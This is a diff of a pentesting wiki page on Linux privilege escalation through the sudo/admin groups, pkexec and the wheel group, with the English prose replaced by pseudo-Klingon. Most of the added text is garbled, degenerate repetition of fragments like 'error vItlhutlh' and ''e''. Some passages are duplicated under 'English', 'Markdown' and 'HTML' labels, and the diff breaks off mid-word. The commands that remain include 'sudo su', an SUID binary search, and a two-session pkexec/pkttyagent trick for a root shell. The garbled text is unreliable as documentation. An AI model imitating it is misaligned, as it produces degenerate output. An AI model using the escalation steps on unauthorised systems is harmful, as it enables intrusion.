@@ -19,7 +19,6 @@ Other ways to support HackTricks:
 ### **PE - Method 1**
 
 **Sometimes**, **by default (or because some software needs it)** inside the **/etc/sudoers** file you can find some of these lines:
-
 ```bash
 # Allow members of group sudo to execute any command
 %sudo	ALL=(ALL:ALL) ALL
@@ -27,56 +26,83 @@ Other ways to support HackTricks:
 # Allow members of group admin to execute any command
 %admin 	ALL=(ALL:ALL) ALL
 ```
-
-This means that **any user that belongs to the group sudo or admin can execute anything as sudo**.
-
-If this is the case, to **become root you can just execute**:
-
+**qaStaHvIS sudo yIqem** **'ej** **qaStaHvIS admin yIqem** **'ej** **sudo** **ghItlh** **ghItlh** **'ej** **qaStaHvIS root yIqem** **'ej** **qaStaHvIS** **root** **ghItlh** **ghItlh**.
 ```
 sudo su
 ```
-
 ### PE - Method 2
 
-Find all suid binaries and check if there is the binary **Pkexec**:
+**tlhIngan Hol** - 2. tIq
 
+**Suid** binaries jImej 'ej **Pkexec** binary **'e'** vItlhutlh:
 ```bash
 find / -perm -4000 2>/dev/null
+```
+**ghItlhvam** **pkexec** **binary** **SUID** **'e'** **'ej** **'ej** **sudo** **'ej** **admin** **'ej**, **pkexec** **binaries** **sudo** **'ej** **execute** **'ej** **SUID** **binary** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **polkit policy** **'ej** **groups** **'ej** **identify** **'ej** **pkexec** **'ej** **use** **'ej** **can** **groups** **'ej** **identify** **'ej** **policy** **'ej** **Check** **'ej**:
+
+```bash
+pkexec --version
 ```
 
 If you find that the binary **pkexec is a SUID binary** and you belong to **sudo** or **admin**, you could probably execute binaries as sudo using `pkexec`.\
 This is because typically those are the groups inside the **polkit policy**. This policy basically identifies which groups can use `pkexec`. Check it with:
-
 ```bash
 cat /etc/polkit-1/localauthority.conf.d/*
 ```
+**tlhIngan Hol**:
 
+DaH jImej **pkexec** 'ej **by default** vItlhutlh linux disctros vItlhutlh **sudo** 'ej **admin** ghom appear.
+
+**root vItlhutlh** **ghItlh** 'ej **execute**:
+
+**English**:
+
+DaH jImej **pkexec** 'ej **by default** vItlhutlh linux disctros vItlhutlh **sudo** 'ej **admin** ghom appear.
+
+**root vItlhutlh** **ghItlh** 'ej **execute**:
+
+**Markdown**:
+
+```
 There you will find which groups are allowed to execute **pkexec** and **by default** in some linux disctros the groups **sudo** and **admin** appear.
 
 To **become root you can execute**:
+```
 
+**HTML**:
+
+<p>There you will find which groups are allowed to execute <strong>pkexec</strong> and <strong>by default</strong> in some linux disctros the groups <strong>sudo</strong> and <strong>admin</strong> appear.</p>
+
+<p>To <strong>become root you can execute</strong>:</p>
 ```bash
 pkexec "/bin/sh" #You will be prompted for your user password
 ```
+**pkexec**-n **ghItlh** **'ej** **'ej** **'oH** **error** **vItlhutlh**:
 
-If you try to execute **pkexec** and you get this **error**:
+```bash
+==== AUTHENTICATING FOR org.freedesktop.policykit.exec ===
+Authentication is needed to run `/usr/bin/pkexec' as the super user
+Authenticating as: User Name,,, (user)
+Password:
+polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
+==== AUTHENTICATION FAILED ===
+Error executing command as another user: Not authorized
 
+This incident has been reported.
+```
+
+**ghItlh** **'ej** **'oH** **error** **vItlhutlh** **'ej** **pkexec** **'ej** **'oH** **ghItlh** **'ej** **'oH** **'ej** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **v
 ```bash
 polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
 ==== AUTHENTICATION FAILED ===
 Error executing command as another user: Not authorized
 ```
-
-**It's not because you don't have permissions but because you aren't connected without a GUI**. And there is a work around for this issue here: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). You need **2 different ssh sessions**:
-
-{% code title="session1" %}
+**ghobe' vItlhutlh**. 'ach **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **gh
 ```bash
 echo $$ #Step1: Get current PID
 pkexec "/bin/bash" #Step 3, execute pkexec
 #Step 5, if correctly authenticate, you will have a root session
 ```
-{% endcode %}
-
 {% code title="session2" %}
 ```bash
 pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
@@ -84,38 +110,31 @@ pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
 ```
 {% endcode %}
 
-## Wheel Group
+## Qa'Hom Group
 
-**Sometimes**, **by default** inside the **/etc/sudoers** file you can find this line:
-
+**Qa'Hom**, **by default**, **Dujmey** **/etc/sudoers** **file** **'e'** **line** **'e'** **'oH** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** 